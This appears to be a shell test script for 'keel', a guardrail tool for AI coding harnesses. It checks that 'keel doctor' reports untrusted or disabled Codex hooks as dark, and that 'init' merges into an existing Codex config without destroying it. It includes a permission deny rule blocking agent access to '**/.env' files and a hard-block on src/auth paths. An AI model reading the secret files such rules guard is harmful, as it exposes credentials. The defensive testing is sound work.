      "codex=$([ -f "$w/.codex/config.toml" ] && echo y || echo n) claude=$([ -f "$w/.claude/settings.json" ] && echo y || echo n) CLAUDE.md=$([ -f "$w/CLAUDE.md" ] && echo y || echo n)"
fi
rm -rf "$w"


# --- The harness section in `keel doctor` ------------------------------------------------------
#
# ADR-0004: a guarantee is a property of (repository, harness). Doctor is the one place somebody
# asks what THEY get, so it answers for the harness in front of them and names what the others do
# not get.
#
# THE MANIFEST ANSWERS WHAT A HARNESS CAN DO. DOCTOR ANSWERS WHAT THIS INSTALLATION DOES. The two
# differ on Codex, which runs no hook until its source is trusted and says nothing when it skips
# one, so `harness_active_gates codex` is a true statement about Codex and a false one about a user
# whose hooks are untrusted. Doctor reporting the manifest's answer there would be keel agreeing
# with itself, which is the fault this plan has been bitten by twice.
#
# CODEX_HOME is set on every case below, and that is not tidiness. Unset, the trust reader falls
# back to the developer's own ~/.codex/config.toml and the verdict becomes a property of whoever is
# running the suite.
trust_home() {   # trust_home <state>; prints a CODEX_HOME holding a config in that state
    local state="$1" d; d="$(mktemp -d)"
    case "$state" in
        # What the 2026-09-06 probe actually wrote: the plugin enabled, and no trust entry of any
        # kind. The absence of trusted_hash is the whole signal.
        untrusted) printf '[plugins."keel@gbi"]\nenabled = true\n' > "$d/config.toml" ;;
        trusted)   printf '[plugins."keel@gbi"]\nenabled = true\n\n[hooks.state."keel@gbi"]\nenabled = true\ntrusted_hash = "9f2c"\n' > "$d/config.toml" ;;
        disabled)  printf '[plugins."keel@gbi"]\nenabled = true\n\n[hooks.state."keel@gbi"]\nenabled = false\ntrusted_hash = "9f2c"\n' > "$d/config.toml" ;;
        # A config that exists and says nothing about keel. Not proof of anything: what that machine
        # needs is the plugin installed, not the hooks trusted, so it must not read as dark. It
        # carries a trusted_hash in an UNRELATED table on purpose. `enabled` and `trusted_hash` are
        # ordinary field names, and a reader that grepped for either without asking which table it
        # sat in would call this machine trusted.
        stranger)  printf '[projects."/tmp/x"]\ntrust_level = "trusted"\ntrusted_hash = "9f2c"\n' > "$d/config.toml" ;;
        # keel installed and NOT trusted, beside a different plugin the user did trust. This is the
        # fail-open direction: read across every table rather than keel's own, a stranger's
        # trusted_hash answers for keel and doctor calls three gates active on a machine where none
        # of them will ever run. Found in review, not by the sweep, because every fixture above
        # holds exactly one plugin.
        foreign_trusted) printf '[plugins."keel@gbi"]\nenabled = true\n\n[hooks.state."other@market"]\nenabled = true\ntrusted_hash = "deadbeef"\n' > "$d/config.toml" ;;
        # And the other direction, which only cries wolf: keel trusted beside a plugin the user
        # turned off.
        foreign_disabled) printf '[plugins."keel@gbi"]\nenabled = true\n\n[hooks.state."keel@gbi"]\nenabled = true\ntrusted_hash = "9f2c"\n\n[plugins."other@market"]\nenabled = false\n' > "$d/config.toml" ;;
        absent)    : ;;
    esac
    printf '%s' "$d"
}

w="$(mktemp -d)"; ( cd "$w" && git init -q -b main . && "$ROOT/bin/keel" init --harness claude,codex -y >/dev/null 2>&1 \
  && python3 - .keel/profile.json <<'PY'
import json,sys
p=sys.argv[1]; d=json.load(open(p)); d["hard_block_paths"]=["src/auth/**"]
json.dump(d, open(p,"w"), indent=2)
PY
)

th_trusted="$(trust_home trusted)"
out="$( cd "$w" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_trusted" "$ROOT/bin/keel" doctor 2>&1 )"
# The plan's text greps for `codex` anywhere in the output, which the gate list and the
# installed-here warning both satisfy whatever the detector answered. Pin the sentence instead.
printf '%s' "$out" | grep -q 'running under codex' && ok "doctor names the running harness" \
  || bad "doctor names the running harness" "no 'running under codex' line"
printf '%s' "$out" | grep -qi 'sensitive-guard' && ok "doctor reports the missing gate" \
  || bad "doctor reports the missing gate" "no mention of sensitive-guard"
printf '%s' "$out" | grep -qi 'hard_block_paths' && ok "doctor warns on an unenforceable hard block" \
  || bad "doctor warns on an unenforceable hard block" "no warning"

# Both signals unset. CLAUDECODE=1 is exported by Claude Code, and this repository is developed
# inside it, so `env -u CODEX_VERSION` alone would leave the detector confidently answering
# "claude" locally and "unknown" in CI. Verified set in the development environment before writing
# this case.
out="$( cd "$w" && env -u CODEX_VERSION -u CLAUDECODE CODEX_HOME="$th_trusted" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'cannot determine' && ok "doctor says when it cannot tell" \
  || bad "doctor says when it cannot tell" "no such line"

# The acceptance case the plan names: the manifest grants the gate, the trust state withholds it,
# and doctor says dark. Without this case the whole trust reader is a comment.
#
# The failure it describes is not "nothing works". The same probe found the 25 skills load without
# trust and the hooks do not, so an untrusted install looks like most of keel working. That is why
# doctor must not also print the manifest's "gates active" line here: two lines, one saying the
# gates are live and one saying they are dark, is worse than either alone.
th_untrusted="$(trust_home untrusted)"
out="$( cd "$w" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_untrusted" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'dark' && ok "doctor reports an untrusted hook as a dark gate" \
  || bad "doctor reports an untrusted hook as a dark gate" "no dark line for an untrusted install"
printf '%s' "$out" | grep -qi 'codex gates active' \
  && bad "doctor does not also call the dark gates active" "both lines printed" \
  || ok "doctor does not also call the dark gates active"

# Trusted and disabled are different states with the same consequence, and only the first is safe
# to report as live.
th_disabled="$(trust_home disabled)"
out="$( cd "$w" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_disabled" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'dark' && ok "doctor reports a disabled hook as a dark gate" \
  || bad "doctor reports a disabled hook as a dark gate" "a disabled hook was reported as live"

out="$( cd "$w" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_trusted" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'codex gates active' && ok "doctor reports a trusted install's gates as active" \
  || bad "doctor reports a trusted install's gates as active" "no gates active line"
printf '%s' "$out" | grep -qi 'dark' \
  && bad "doctor does not cry dark on a trusted install" "$(printf '%s' "$out" | grep -i dark | head -1)" \
  || ok "doctor does not cry dark on a trusted install"

# Absent or unreadable Codex config is not proof of anything. The manifest fails closed on missing
# evidence because a wrong `provides` row is unsafe; a doctor line that cries wolf on every machine
# gets ignored, which costs more than it saves.
th_absent="$(trust_home absent)"
out="$( cd "$w" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_absent" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'cannot tell' && ok "doctor says trust could not be determined" \
  || bad "doctor says trust could not be determined" "no such line"
printf '%s' "$out" | grep -qi 'dark' \
  && bad "an unreadable Codex config is not reported as dark" "$(printf '%s' "$out" | grep -i dark | head -1)" \
  || ok "an unreadable Codex config is not reported as dark"

th_stranger="$(trust_home stranger)"
out="$( cd "$w" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_stranger" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'dark' \
  && bad "a Codex config that never mentions keel is not reported as dark" "$(printf '%s' "$out" | grep -i dark | head -1)" \
  || ok "a Codex config that never mentions keel is not reported as dark"
printf '%s' "$out" | grep -qi 'codex gates active' \
  && bad "a trusted_hash in an unrelated table does not grant trust" "the gates were reported active" \
  || ok "a trusted_hash in an unrelated table does not grant trust"

th_foreign_t="$(trust_home foreign_trusted)"
out="$( cd "$w" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_foreign_t" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'dark' && ok "another plugin's trust does not make keel's hooks trusted" \
  || bad "another plugin's trust does not make keel's hooks trusted" "keel read as trusted on a stranger's trusted_hash"

th_foreign_d="$(trust_home foreign_disabled)"
out="$( cd "$w" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_foreign_d" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'codex gates active' && ok "another plugin being disabled does not darken keel's gates" \
  || bad "another plugin being disabled does not darken keel's gates" "keel read as untrusted because a stranger was disabled"

# HOME unset, which a container or a cron shell does. bin/keel runs under `set -u`, and the trust
# reader is called inside a command substitution: a bare `$HOME` there kills the SUBSHELL, leaves
# the verdict empty, and doctor falls through to "gates active" on a machine whose config it never
# read. That is silent and it fails open, so the case asserts the answer and not merely survival.
out="$( cd "$w" && env -u HOME -u CODEX_HOME CODEX_VERSION=0.153.4 "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'cannot tell' && ok "an unset HOME reads as unknown, not as trusted" \
  || bad "an unset HOME reads as unknown, not as trusted" "${out:0:120}"

# A harness installed on this machine that the repository does not list. A machine fact, so it
# belongs in doctor and never in init, which writes a committed team fact.
v="$(mktemp -d)"; ( cd "$v" && git init -q -b main . && "$ROOT/bin/keel" init --harness claude -y >/dev/null 2>&1 )
bindir="$(mktemp -d)"; printf '#!/bin/sh\nexit 0\n' > "$bindir/codex"; chmod +x "$bindir/codex"
out="$( cd "$v" && env -u CODEX_VERSION -u CLAUDECODE PATH="$bindir:$PATH" CODEX_HOME="$th_trusted" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -qi 'installed on this machine' && ok "doctor names a harness installed here that the repository omits" \
  || bad "doctor names a harness installed here that the repository omits" "no such line"
rm -rf "$bindir"

# The two context window messages were Claude Code numbers. A Codex rollout states its own window,
# `model_context_window`, 258400 on the probed session, so on Codex "assuming 200000" and "below the
# 200000 default" both name a baseline that is not the one in force.
python3 - "$v" <<'PY5'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
del d["gates"]["context_window"]
p.write_text(json.dumps(d,indent=2)+"\n")
PY5
out="$( cd "$v" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_trusted" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -q 'model_context_window' && ok "doctor names the window Codex states, not one it assumes" \
  || bad "doctor names the window Codex states, not one it assumes" "no mention of model_context_window"
printf '%s' "$out" | grep -q 'window assumed 200000' \
  && bad "doctor does not tell a Codex user the window is assumed 200000" "the Claude Code sentence is still printed" \
  || ok "doctor does not tell a Codex user the window is assumed 200000"

# R-01: the Claude Code sentence is unchanged. Nothing about this task may alter what a Claude Code
# user reads, and the branch above is the one place it could have.
out="$( cd "$v" && env -u CODEX_VERSION CLAUDECODE=1 CODEX_HOME="$th_trusted" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -q 'window assumed 200000' && ok "the Claude Code window sentence is unchanged" \
  || bad "the Claude Code window sentence is unchanged" "the 200000 sentence stopped being printed under Claude Code"

# The floor message, the second of the two. A value below the floor never takes effect on either
# harness; naming 200000 as the baseline it is below is what is wrong on Codex.
python3 - "$v" <<'PY6'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d.setdefault("gates",{})["context_window"]=50000
p.write_text(json.dumps(d,indent=2)+"\n")
PY6
out="$( cd "$v" && CODEX_VERSION=0.153.4 CODEX_HOME="$th_trusted" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -q 'below the 200000 default' \
  && bad "doctor does not name 200000 as the Codex baseline" "the Claude Code floor sentence is still printed" \
  || ok "doctor does not name 200000 as the Codex baseline"
printf '%s' "$out" | grep -q '50000' && ok "doctor still names the floor a Codex user set" \
  || bad "doctor still names the floor a Codex user set" "the configured 50000 went unmentioned"
out="$( cd "$v" && env -u CODEX_VERSION CLAUDECODE=1 CODEX_HOME="$th_trusted" "$ROOT/bin/keel" doctor 2>&1 )"
printf '%s' "$out" | grep -q 'below the 200000 default' && ok "the Claude Code floor sentence is unchanged" \
  || bad "the Claude Code floor sentence is unchanged" "the floor sentence stopped being printed under Claude Code"

rm -rf "$w" "$v" "$th_trusted" "$th_untrusted" "$th_disabled" "$th_absent" "$th_stranger" \
       "$th_foreign_t" "$th_foreign_d"


# --- init must not destroy a Codex configuration it did not write --------------------------------
#
# `keel init` is documented as re-runnable and cmd_new calls the same path. The Claude writer
# branches on an existing settings.json and merges into it; the Codex writer truncated. Worse, a
# TRACKED .codex/config.toml is the only signal harness_set_for_repo uses to decide a repository
# serves Codex, so the file that opts a team in was the file the next init destroyed, taking their
# model choice, MCP servers and their own permission profiles with it.
w="$(mktemp -d)"
# The identity is load bearing here, not boilerplate: the commit below is what makes
# .codex/config.toml a TRACKED file, which is the only signal harness_set_for_repo reads. On a
# machine with no global user.name the commit fails, init never runs, and this reads as keel
# dropping its own table from a config it never saw.
( cd "$w" && git init -q -b main . && git config user.email t@t.t && git config user.name t \
  && mkdir -p .codex && cat > .codex/config.toml <<'TOML'
model = "gpt-5-codex"

[mcp_servers.internal]
command = "node"

[permissions.team.filesystem.":workspace_roots"]
"vendor/**" = "read"
TOML
git add -A && git commit -qm x && "$ROOT/bin/keel" init --harness claude,codex -y >/dev/null 2>&1 )

for keep in 'model = "gpt-5-codex"' '[mcp_servers.internal]' '[permissions.team.filesystem' '"vendor/**" = "read"'; do
    grep -qF "$keep" "$w/.codex/config.toml" \
      && ok "init preserves an existing codex config: $keep" \
      || bad "init preserves an existing codex config: $keep" "gone after init"
done
grep -qF '"**/.env" = "deny"' "$w/.codex/config.toml" \
  && ok "init still adds keel's denies to an existing codex config" \
  || bad "init still adds keel's denies to an existing codex config" "keel's own table is missing"

# Idempotent. Re-running must not append a second copy of keel's table, which is how a managed
# block turns into a file that grows by one block per init.
( cd "$w" && "$ROOT/bin/keel" init --harness claude,codex -y >/dev/null 2>&1 )
n="$(grep -c '\[permissions.keel.filesystem' "$w/.codex/config.toml")"
[ "$n" = 1 ] && ok "re-running init leaves one keel table, not two" \
  || bad "re-running init leaves one keel table, not two" "found $n"
n="$(grep -c 'model = "gpt-5-codex"' "$w/.codex/config.toml")"
[ "$n" = 1 ] && ok "re-running init does not duplicate the team's own keys" \
  || bad "re-running init does not duplicate the team's own keys" "found $n"

# A rule keel drops has to leave, or the managed region only ever grows. The whole region is
# replaced rather than merged into, which is what makes that true.
python3 - "$w/.codex/config.toml" <<'PY'
import sys
p = sys.argv[1]
t = open(p).read().replace('"**/.env" = "deny"', '"**/gone-from-keel" = "deny"')
open(p, "w").write(t)
PY
( cd "$w" && "$ROOT/bin/keel" init --harness claude,codex -y >/dev/null 2>&1 )
grep -qF '"**/gone-from-keel" = "deny"' "$w/.codex/config.toml" \
  && bad "a rule keel no longer writes is removed from its own table" "the stale rule survived" \
  || ok "a rule keel no longer writes is removed from its own table"
rm -rf "$w"

# --- every harness's context file, not whichever was sourced last --------------------------------
#
# The rule this file states at `bin/keel#makes the loaded harness whichever ran last` is that nothing outside a harness_each call may assume
# which harness is loaded. referenced_docs_findings called harness_context_file bare, so it scanned
# whatever happened to be loaded last. Benign only while codex.sh returns nothing; a harness that
# returns a context file would have had its links silently unchecked.
grep -n 'harness_context_file' "$ROOT/bin/keel" | grep -v 'harness_each harness_context_file' \
  | sed 's/^[0-9]*://' | grep -vE '^[[:space:]]*#' | grep -q 'harness_context_file' \
  && bad "every harness_context_file call goes through harness_each" \
       "$(grep -n 'harness_context_file' "$ROOT/bin/keel" | grep -v 'harness_each harness_context_file' | grep -vE ':[[:space:]]*#' | head -1)" \
  || ok "every harness_context_file call goes through harness_each"


# --- the six keys nothing could honour -----------------------------------------------------------
#
# Six keys were retired because nothing could honour them, and init must stop writing the five it
# writes. A profile that still carries them is not broken; it is stale, and doctor's version
# comparison says so. What this pins is init writing a key the schema no longer declares, which is
# the silent half: `tests/validate-skills.sh#A key with no description is a key a reader cannot act on` records that the fingerprint checks the schema
# document and not what write_profile emits, so nothing else compares the two.
#
# READ THE SUBTREE, NOT THE FILE. A bare grep for "observability" matches the top-level
# "observability" object init also writes at bin/keel#"observability": { "backend": "signoz", so a gates.observability case would fail
# forever against a correct implementation. "review" has the same trap inside
# "code-review@claude-plugins-official" in plugins.recommended. Parse the JSON and look in the one
# place the key would be.
wr="$(fixture node-ts)"
( cd "$wr" && "$KEEL" init -y >/dev/null 2>&1 )
left="$( python3 - "$wr/.keel/profile.json" <<'PY'
import json, sys
d = json.load(open(sys.argv[1]))
gone = [("gates", k) for k in ("tdd", "review", "observability", "docs_updated")]
gone += [("conventions", "working_branch"), ("observability", "log_shipping")]
print(" ".join("%s.%s" % (p, k) for p, k in gone if k in (d.get(p) or {})))
PY
)"
[ -z "$left" ] && ok "init writes none of the six retired keys" \
  || bad "init writes none of the six retired keys" "still written: $left"

sv="$(python3 -c "import json;print(json.load(open('$wr/.keel/profile.json'))['schema_version'])")"
[ "$sv" = "4" ] && ok "init writes schema version 4" \
  || bad "init writes schema version 4" "got $sv"

# The floor for the first case. What it covers is a profile that parses but carries a gates object
# missing keys: that would satisfy "none of the six are present" while breaking every gate that
# survived, so the five survivors are named here rather than counted. It is not a floor for a
# missing or unparseable profile. This file runs without set -e, so on one of those both heredoc
# python3 calls die with empty stdout, left and kept are both empty, and cases 1 and 3 both report
# PASS. The schema version case above is what catches that, because sv comes back empty and the
# comparison against 4 fails.
kept="$( python3 - "$wr/.keel/profile.json" <<'PY'
import json, sys
g = json.load(open(sys.argv[1])).get("gates") or {}
print(" ".join(k for k in ("coding_standards", "security_audit", "commit_guard",
                           "done_verified", "context_window") if k not in g))
PY
)"
[ -z "$kept" ] && ok "init still writes the five gates that survive" \
  || bad "init still writes the five gates that survive" "missing: $kept"
rm -rf "$wr"

printf '\n%s passed, %s failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
